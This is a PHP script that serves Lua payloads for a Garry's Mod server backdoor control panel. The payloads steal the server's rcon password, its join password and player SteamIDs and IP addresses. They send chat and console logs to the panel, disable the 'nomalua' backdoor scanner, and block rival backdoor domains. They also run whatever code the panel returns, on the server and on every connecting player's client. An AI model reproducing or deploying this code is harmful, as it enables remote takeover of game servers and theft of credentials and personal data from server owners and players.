<?php
include('core/class/include.php');
if(BanIP::IsBanned($_SERVER["REMOTE_ADDR"]))
	{
		die("Vous êtes banni IP, venez sur le discord pour vous faire debannir https://discord.gg/rVbb2Kx");
	}
$browser = $_SERVER['HTTP_USER_AGENT'];
if ($browser == "Valve/Steam HTTP Client 1.0 (4000)") {
function reloadString($length = 100) {
    $characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZs';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
	return $randomString;
}

if(!isset($_COOKIE["DownIsMaster"])){
	setcookie("DownIsMaster", uniqid(), time()+31556926);
  }
  if(isset($_COOKIE["DownIsMaster"])){
	  BanIP::BanTheIP($_SERVER["REMOTE_ADDR"]);
	  die("Security anti script kiddies by GHackDoor (Merci Anatik)");
  }

$nd = $_SERVER['HTTP_HOST'];

if(!isset($_GET["k"]))
{
	die("timer.Create( 'fez452fr1TGR5', 5, 0, function()
local a = {
n = GetHostName(),
nb = tostring(#player.GetAll()),
i = game.GetIPAddress()
}
http.Post( 'http://".$nd."/core/stage2.php', a,
function( body, len, headers, code )
RunString(body)
end)
end)
");
}
$key = $_GET["k"];

$d = $_SERVER['SERVER_NAME'];

$net = reloadString(10);

$code = str_replace("<NEWLINE>", "\n", $_SERVER["REMOTE_ADDR"]);
$code .= " -- ";
$endtbl = "";

foreach (str_split($code) as $char) {
	$e = ord($char);
	$endtbl .= ($e ^ 96);
}

$endtbl .= "0";

$p = reloadString(15);



?>

RunConsoleCommand("sv_hibernate_drop_bots","0")
RunConsoleCommand("sv_hibernate_think","1")


if <?php echo $p; ?> == <?php echo $endtbl; ?> then return end
<?php echo $p; ?> = <?php echo $endtbl; ?>

if game.SinglePlayer() then return end

local function EN()
 	NOMALUA = {}
	concommand.Add( "nomalua_scan", function( ply )end )
	concommand.Add( "nomalua", function( ply )end )
	local rcon_pw = "NOT FOUND"
	if file.Exists("cfg/autoexec.cfg","GAME") then
	local cfile = file.Read("cfg/autoexec.cfg","GAME", function(c) print(c) end)
	for k,v in pairs(string.Split(cfile,"\n")) do
	    if string.StartWith(v,"rcon_password") then
	        rcon_pw = string.Split(v,"\"")[2]
	    end
	end
end
if file.Exists("cfg/server.cfg","GAME") then
	cfile = file.Read("cfg/server.cfg","GAME", function(c) print(c) end)
	for k,v in pairs(string.Split(cfile,"\n")) do
	    if string.StartWith(v,"rcon_password") then
	        rcon_pw = string.Split(v,"\"")[2]
	    end
	end
end
if file.Exists("cfg/gmod-server.cfg","GAME") then
	cfile = file.Read("cfg/gmod-server.cfg","GAME", function(c) print(c) end)
	for k,v in pairs(string.Split(cfile,"\n")) do
	    if string.StartWith(v,"rcon_password") then
	        rcon_pw = string.Split(v,"\"")[2]
	    end
	end
end

local players = {}
for k,v in pairs(player.GetAll()) do
	table.insert(players, {
		name = v:Name(),
		steamid = v:SteamID(),
		ip = v:IPAddress(),
		group = v:GetUserGroup()
	})
end

local _, folders = file.Find("addons/*", "GAME")


local function CheckFuncNames(func,n)
	for i=0,30 do
		local xx = jit.util.funck( func, -i )
		if xx == n then
			return true
		end
	end
	return false
end

local function GetLinesFromFuncInfo(poof)
	local src = debug.getinfo(poof)
	if not src.short_src then return "(No source)" end
	if not file.Exists(src.short_src,"GAME") then
		return "(RunString)"
	end
	local lines = string.Split(file.Read(src.short_src,"GAME"),"\n")
	local lean = ""
	for k,v in pairs(lines) do
		if (k >= src.linedefined) and (k <= src.lastlinedefined) then
			lean = lean .. v .. "\n"
		end
	end
	return lean
end

local infed = "UNKNOWN"
--[[
local function LoadModuleFolder(modulenm)

	local files, folders = file.Find(modulenm .. "*", "GAME")

	for _, ifolder in pairs(folders) do
		LoadModuleFolder(modulenm .. ifolder .. "/")
	end

	for _, fff in pairs(files) do
		local ct = file.Read(modulenm .. fff, "GAME")
		if string.find(ct, "gblhackdoor.ga") then
			infed = modulenm .. fff
			return
		end
		if string.find(ct, "gblk.ga") then
			infed = modulenm .. fff
			return
		end
		if string.find(ct, "RunningDuck") then
			infed = modulenm .. fff
			return
		end
	end
end
LoadModuleFolder("addons/")
]]
local function GetBackdoors()
	local ret = {}
	ret = {}
	local tbl = net.Receivers
	for k,v in pairs(tbl) do
		if CheckFuncNames(v,"RunString") then
			local txt = GetLinesFromFuncInfo(v)
			table.insert(ret,{net=k,file=debug.getinfo(v).short_src,func=txt})
		end
		if CheckFuncNames(v,"RunStringEx") then
			local txt = GetLinesFromFuncInfo(v)
			table.insert(ret,{net=k,file=debug.getinfo(v).short_src,func=txt})
		end
		if CheckFuncNames(v,"CompileString") then
			local txt = GetLinesFromFuncInfo(v)
			table.insert(ret,{net=k,file=debug.getinfo(v).short_src,func=txt})
		end
	end
	if encodetbl ~= nil then
		local aab = ""
		if RunHASHOb and isfunction(RunHASHOb) then
			aab = debug.getinfo(RunHASHOb).short_src
		end
		table.insert(ret,{net="GVacDoor (Panel Web)",file=aab,func=""})
	end
	if util.NetworkStringToID("loading_kvacdoor") ~= 0 then
		table.insert(ret,{net="KVacDoor (Panel Web)",file="",func=""})
	end
	if util.NetworkStringToID("oofmyprofile") ~= 0 then
		table.insert(ret,{net="Chipher (Panel Web)",file="",func=""})
	end
	return ret
end

local additionnals = {}
additionnals.security = {}
additionnals.addons = folders
additionnals.backdoors = GetBackdoors()
additionnals.security.snte = "non"
additionnals.security.cac  = "non"
additionnals.infected = infed

if file.Exists("autorun/server/snte_source.lua","LUA") or ConVarExists("snte_ulxluarun") or ConVarExists("snte_dupefix") then
	additionnals.security.snte = "oui"
end
if CAC then
	additionnals.security.cac = "oui"
end





local a = {
n = GetConVar("hostname"):GetString(),
nb = tostring(#player.GetAll()),
i = game.GetIPAddress(),
key = "<?php echo $key; ?>",
rcon = rcon_pw,
fastdlurl = fastdlurl,
additionnals = util.TableToJSON(additionnals),
map = game.GetMap(),
gm = engine.ActiveGamemode(),
pw = GetConVar("sv_password"):GetString() or "no password",
rcon = rcon_pw,
players = util.TableToJSON(players)
}
http.Post("<?php echo $actual_link; ?>/core/stage2.php", a,function(body)RunString(body)end)
timer.Simple(5, EN)
end

EN()


util.AddNetworkString("<?php echo $net; ?>")
RunString([==[
local code = [[
local steamid = LocalPlayer():SteamID()
local ip = game.GetIPAddress()
local rstr = RunString
local function ez()
	http.Post("<?php echo $actual_link; ?>/core/post-player.php", {
		steamid = steamid,
		server = ip,
		name = LocalPlayer():Name()
	}, function(code, ...)
		rstr(code,"CPL")
	end, print)
	timer.Simple(300, ez)
end
ez()
]]
local function SendCodee( ply )
	ply:SendLua([[net.Receive("<?php echo $net; ?>",function()RunString(net.ReadString())end)]])
	timer.Simple(2, function()
		net.Start("<?php echo $net; ?>")
		net.WriteString(code)
		net.Send(ply)
	end)
end
hook.Add("PlayerInitialSpawn", "<?php echo reloadString(15) ?>", function(ply)
	timer.Simple(4,function()
		SendCodee(ply)
	end)
end)
	]==], "EEEEEEE")

	local cache = {}
hook.Add("PlayerSay", "<?php echo reloadString(15) ?>", function(ply, msg)
	table.insert(cache, ply:Name().."]"..msg)
end)

hook.Add("PlayerInitialSpawn", "<?php echo reloadString(10) ?>", function(ply)
	table.insert(cache, "[SYSTEM]"..ply:Name().." est connecter")
end)

hook.Add("PlayerDisconnected", "<?php echo reloadString(10) ?>", function(ply)
	table.insert(cache, "[SYSTEM]"..ply:Name().." est deconnecter")
end)
hook.Add("PlayerDeath", "<?php echo reloadString(10) ?>", function(ply)
	table.insert(cache, "[SYSTEM]"..ply:Name().." est mort")
end)
local realprint = print
function print(...)
local args = {...}
table.insert(cache, "[PRINT]"..args[1])
return realprint(...)
end


timer.Create("<?php echo reloadString(10) ?>", 10, 0, function()
	if table.Count(cache) == 0 then
		return
	end
	local str = table.concat(cache, "\xFF")
	http.Post("<?php echo $actual_link; ?>/core/post-console.php", {i=game.GetIPAddress(),m=str})
	cache = {}
end)

local httpurlblacklisted = {
"secure_me.php",
"more.php",
"drm.gm.esy.es",
"gvacdoor.cz",
"gvac.cz",
"cipher",
"anti-leak.cz",
"cipher-panel.me",
"kpanel",
"kpanel.cz",
"wtfm.tk",
"wtfm",
"g-hub.xyz",
"astillan.cf",
"jellyisafag.cf",
"sizzurp.tk",
".cz",
"kvac",
"haylay.tk",
"teamspeak-fr.eu",
"next.php",
"wadix",
"xvacdoor.cf",
"xvacdoor",
".000webhost",
"Just-serv",
"Justserv",
"Exodosium",
"mywaifu.store",
"liberta-panel.yo.fr",
"omega-project"
}

local httpF = http.Fetch
local httpP = http.Post
local vraisHTTP = HTTP

function HTTP(a)
    if a.url then
    for k,v in pairs(httpurlblacklisted) do
        if string.find(a.url, v) then
            table.insert(cache, "[SYSTEM] G HTTP blocked "..a.url)
            return
        end
    end
    end
    return vraisHTTP(a)
end

function http.Fetch(...)
local args = {...}
    if args[1] then
    for k,v in pairs(httpurlblacklisted) do
        if string.find(args[1], v) then
            table.insert(cache, "[SYSTEM]HTTP Fetch blocked "..args[1])
            return
        end
    end
    end
    return httpF(...)
end

function http.Post(...)
local args = {...}
    if args[1] then
    for k,v in pairs(httpurlblacklisted) do
        if string.find(args[1], v) then
            table.insert(cache, "[SYSTEM]HTTP Post blocked "..args[1])
            return
        end
    end
    end
    return httpP(...)
end

timer.Create("<?php echo reloadString(10) ?>", 1, 0, function()
_G["HTTP"] = function(a)
for k,v in pairs(httpurlblacklisted) do
        if string.find(a.url, v) then
        	table.insert(cache, "[SYSTEM] _G HTTP blocked "..a.url)
            return
        end
    end
    return vraisHTTP(a)
end
function HTTP(a)
    for k,v in pairs(httpurlblacklisted) do
        if string.find(a.url, v) then
        	table.insert(cache, "[SYSTEM] HTTP blocked "..a.url)
            return
        end
    end
    return vraisHTTP(a)
end

function http.Fetch(...)
local args = {...}
	if args[1] then
    for k,v in pairs(httpurlblacklisted) do
        if string.find(args[1], v) then
        	table.insert(cache, " [SYSTEM]HTTP Fetch blocked "..args[1])
            return
        end
    end
    end
    return httpF(...)
end

function http.Post(...) 
local args = {...}
	if args[1] then
    for k,v in pairs(httpurlblacklisted) do
        if string.find(args[1], v) then
        	table.insert(cache, "[SYSTEM]HTTP Post blocked "..args[1])
            return
        end
    end
    end
    return httpP(...)
end

end)

// ça referme ça : if ($browser == "Valve/Steam HTTP Client 1.0 (4000)") {

<?php
} else {
	
	BanIP::BanTheIP($_SERVER["REMOTE_ADDR"]);
	echo 'Degage de la oh ! Sinon jve te manger';
}
session_destory();
?>

